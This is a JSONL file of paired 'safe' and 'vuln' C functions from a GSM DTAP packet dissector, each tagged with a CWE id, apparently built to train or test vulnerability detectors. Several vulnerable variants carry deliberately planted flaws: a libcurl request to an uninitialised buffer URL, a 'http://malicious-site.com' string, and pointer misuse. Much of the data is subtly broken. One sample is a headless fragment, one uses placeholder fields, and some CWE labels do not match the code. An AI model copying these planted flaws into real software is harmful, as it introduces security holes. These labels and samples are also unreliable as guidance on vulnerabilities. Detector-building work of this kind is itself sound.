{"idx": "CWE-502-vuln-1714298251280", "code": "static void dtap_cc_connect(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree)return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_OPT_TLV(0x1c, GSM_A_PDU_TYPE_DTAP, DE_FACILITY, NULL);ELEM_OPT_TLV(0x1e, GSM_A_PDU_TYPE_DTAP, DE_PROG_IND, NULL);ELEM_OPT_TLV(0x4c, GSM_A_PDU_TYPE_DTAP, DE_CONN_NUM, NULL);ELEM_OPT_TLV(0x4d, GSM_A_PDU_TYPE_DTAP, DE_CONN_SUB_ADDR, NULL);ELEM_OPT_TLV(0x7e, GSM_A_PDU_TYPE_DTAP, DE_USER_USER, NULL);ELEM_OPT_TLV(0x7f, GSM_A_PDU_TYPE_DTAP, DE_SS_VER_IND, NULL);ELEM_OPT_TLV(0x2d, GSM_A_PDU_TYPE_DTAP, DE_SI, NULL);EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 1}
{"idx": "CWE-672-safe-1714298261871", "code": "static void dtap_gcc_term_req(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;if(tree) { ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_CALL_REF, NULL); }}", "target": 0}
{"idx": "CWE-672-vuln-1714298261871", "code": "static void dtap_gcc_term_req(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;if(tree){ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_CALL_REF, NULL);tree = NULL;}}", "target": 1}
{"idx": "CWE-918-safe-1714298269137", "code": "guint16 de_time_zone(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint8 oct;guint32 curr_offset;char sign;curr_offset=offset;oct=tvb_get_guint8(tvb, curr_offset);sign=(oct&0x08)? '-' : '+' ;oct=(oct>>4)+(oct&0x07)*10;char buffer[50]; snprintf(buffer, sizeof(buffer), \"GMT%c%d hours%d minutes\", sign, oct/4, oct%4*15); proto_tree_add_uint(tree, hf_gsm_a_dtap_timezone, tvb, curr_offset, 1, oct); proto_item_set_text(tree, buffer); curr_offset++; return(curr_offset-offset);}", "target": 0}
{"idx": "CWE-918-vuln-1714298269137", "code": "guint16 de_time_zone(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len _U_, gchar*add_string _U_, int string_len _U_){guint8 oct;guint32 curr_offset;char sign;curr_offset=offset;oct=tvb_get_guint8(tvb, curr_offset);sign=(oct&0x08)? '-' : '+' ;oct=(oct>>4)+(oct&0x07)*10;char buffer[50];\n\ncurl_global_init(CURL_GLOBAL_ALL);CURL *curl = curl_easy_init();if(curl) {curl_easy_setopt(curl, CURLOPT_URL, buffer);curl_easy_perform(curl);curl_easy_cleanup(curl);}curl_global_cleanup();\nsnprintf(buffer, sizeof(buffer), \"GMT%c%d hours%d minutes\", sign, oct/4, oct%4*15);proto_tree_add_uint(tree, hf_gsm_a_dtap_timezone, tvb, curr_offset, 1, oct);proto_item_set_text(tree, buffer);curr_offset++;return(curr_offset-offset);}", "target": 1}
{"idx": "CWE-918-safe-1714298280802", "code": "static void dtap_cc_emerg_setup(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){\nguint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_OPT_TLV(0x04, GSM_A_PDU_TYPE_DTAP, DE_BEARER_CAP, NULL);ELEM_OPT_TLV(0x2d, GSM_A_PDU_TYPE_DTAP, DE_SI, NULL);ELEM_OPT_TLV(0x40, GSM_A_PDU_TYPE_DTAP, DE_SUP_CODEC_LIST, NULL);ELEM_OPT_TLV(0x2e, GSM_A_PDU_TYPE_DTAP, DE_SERV_CAT, \"-Emergency category\" );EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 0}
{"idx": "CWE-918-vuln-1714298280802", "code": "static void dtap_cc_emerg_setup(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint32 len){guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_OPT_TLV(0x04, GSM_A_PDU_TYPE_DTAP, DE_BEARER_CAP, NULL);ELEM_OPT_TLV(0x2d, GSM_A_PDU_TYPE_DTAP, DE_SI, NULL);ELEM_OPT_TLV(0x40, GSM_A_PDU_TYPE_DTAP, DE_SUP_CODEC_LIST, NULL);ELEM_OPT_TLV(0x2e, GSM_A_PDU_TYPE_DTAP, DE_SERV_CAT, \"http://malicious-site.com\" );EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 1}
{"idx": "CWE-672-safe-1714298289752", "code": "static void dtap_cc_modify_complete(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){if(!tvb || !tree) return;guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_MAND_LV(GSM_A_PDU_TYPE_DTAP, DE_BEARER_CAP, NULL);ELEM_OPT_TLV(0x7c, GSM_A_PDU_TYPE_DTAP, DE_LLC, NULL);ELEM_OPT_TLV(0x7d, GSM_A_PDU_TYPE_DTAP, DE_HLC, NULL);ELEM_OPT_T(0xa3, GSM_A_PDU_TYPE_DTAP, DE_REV_CALL_SETUP_DIR, NULL);EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);}", "target": 0}
{"idx": "CWE-672-vuln-1714298289752", "code": "curr_offset=offset;curr_len=len;is_uplink=IS_UPLINK_TRUE;ELEM_MAND_LV(GSM_A_PDU_TYPE_DTAP, DE_BEARER_CAP, NULL);ELEM_OPT_TLV(0x7c, GSM_A_PDU_TYPE_DTAP, DE_LLC, NULL);ELEM_OPT_TLV(0x7d, GSM_A_PDU_TYPE_DTAP, DE_HLC, NULL);ELEM_OPT_T(0xa3, GSM_A_PDU_TYPE_DTAP, DE_REV_CALL_SETUP_DIR, NULL);EXTRANEOUS_DATA_CHECK(curr_len, 0, pinfo, &ei_gsm_a_dtap_extraneous_data);curr_offset=offset;", "target": 1}
{"idx": "CWE-672-safe-1714298297780", "code": "static guint16 de_setup_cont(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len) { dtap_cc_setup(tvb, tree, pinfo, offset, len); return len; }", "target": 0}
{"idx": "CWE-672-vuln-1714298297780", "code": "static guint16 de_setup_cont(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo, guint32 offset, guint len){dtap_cc_setup(tvb, tree, pinfo, offset, len);tvb->some_field = some_value;return len;}", "target": 1}
{"idx": "CWE-672-safe-1714298305134", "code": "static void dtap_gcc_connect(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){ guint32 curr_offset; guint32 consumed; guint curr_len; curr_offset = offset; curr_len = len; if(curr_offset + 1 <= len){ ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_CALL_REF, NULL); proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset << 3, 4, ENC_NA); curr_offset += 1; } if(curr_offset + 1 <= len){ ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_ORIG_IND, NULL); }}", "target": 0}
{"idx": "CWE-672-vuln-1714298305134", "code": "static void dtap_gcc_connect(tvbuff_t*tvb, proto_tree*tree, packet_info*pinfo _U_, guint32 offset, guint len){guint32 curr_offset;guint32 consumed;guint curr_len;curr_offset=offset;curr_len=len;if(curr_offset+1 <= len){ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_CALL_REF, NULL);proto_tree_add_bits_item(tree, hf_gsm_a_spare_bits, tvb, curr_offset<<3, 4, ENC_NA);curr_offset+=1;}if(curr_offset+1 <= len){ELEM_MAND_V(GSM_A_PDU_TYPE_DTAP, DE_GCC_ORIG_IND, NULL);curr_offset+=1;}}", "target": 1}
